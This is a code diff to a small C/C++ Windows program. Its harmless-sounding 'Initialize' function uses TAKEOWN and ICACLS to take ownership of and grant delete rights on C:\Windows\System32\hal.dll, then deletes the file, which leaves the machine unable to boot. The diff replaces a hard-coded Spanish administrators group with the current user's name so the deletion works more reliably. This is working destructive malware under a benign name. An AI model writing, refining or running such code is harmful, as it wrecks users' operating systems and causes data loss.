@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <shlobj.h>
+#include <lmcons.h>
 
 void Initialize() {
   system("ver > version");
@@ -16,18 +17,25 @@ void Initialize() {
     exit(EXIT_FAILURE);
   }
   const char* file = "C:\\Windows\\System32\\hal.dll";
-  char* takeown = new char[strlen(file) + 25];
+  char* takeown = new char[strlen(file) + 22];
   strcpy(takeown, "TAKEOWN /F ");
   strcat(takeown, file);
-  strcat(takeown, " /A >nul 2>&1");
+  strcat(takeown, " >nul 2>&1");
   system(takeown);
   delete takeown;
-  char* grant = new char[strlen(file) + 43];
+
+  DWORD length = UNLEN + 1;
+  char username[UNLEN + 1];
+  GetUserName(username, &length);
+  char* grant = new char[strlen(file) + length + 28];
   strcpy(grant, "ICACLS ");
   strcat(grant, file);
-  strcat(grant, " /GRANT Administradores:F >nul 2>&1"); // Administrators
+  strcat(grant, " /GRANT ");
+  strcat(grant, username);
+  strcat(grant, ":D >nul 2>&1");
   system(grant);
   delete grant;
+
   remove(file);
 }
 
